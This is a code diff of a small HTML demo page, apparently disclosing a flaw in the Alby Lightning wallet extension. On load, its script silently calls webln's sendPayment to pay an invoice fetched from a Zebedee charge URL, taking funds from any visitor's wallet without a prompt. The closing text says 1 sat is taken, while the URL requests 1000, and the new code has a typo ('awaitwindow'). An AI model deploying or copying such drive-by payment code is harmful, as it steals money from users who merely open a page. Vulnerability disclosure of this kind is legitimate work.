@@ -1,9 +1,13 @@
 <title>Your Sats are gone!</title>
 <script>
-window.setTimeout(() => {
-  window.webln.execute("sendPayment", {
-  paymentRequest: "lnbc500n1p3yfyrgpp5r46u3lavy56gswlfce4vqe030qtx2awzrm63rzppygvfhgxs4hkqdqqcqzpgxqyz5vqsp5kk0tkme0tk6mpkz6s3jzhpu7dftsfqxlvvpe5l5m4gt9qga8rqts9qyyssqdq7v75n867tgwj4ua9a8h9l7c6kzk3320qy2j3zjw0sqwkstnwdpamc7dn0hwcy70rae3vld9efzf0zqpn7fkhk8snjsavrmv0a5jmqqmvd2nm"
- });
-}, 3000);
+  async function sendFreeSats() {
+    const zbdData = await fetch("https://api.zebedee.io/v0/process-static-charges/8755f68e-54a4-497c-a50b-ce07c8270b88?amount=1000");
+    const actualInvoice = (await zbdData.json()).pr;
+  awaitwindow.webln.execute("sendPayment", {
+  paymentRequest: actualInvoice
+  });
+  }
+  sendFreeSats();
 </script>
 <h1>I took your Sats!</h1>
+This is a demo site for an Alby vulnerability which sends me 1 sat on every reload. Let me know if you want me to send it back.
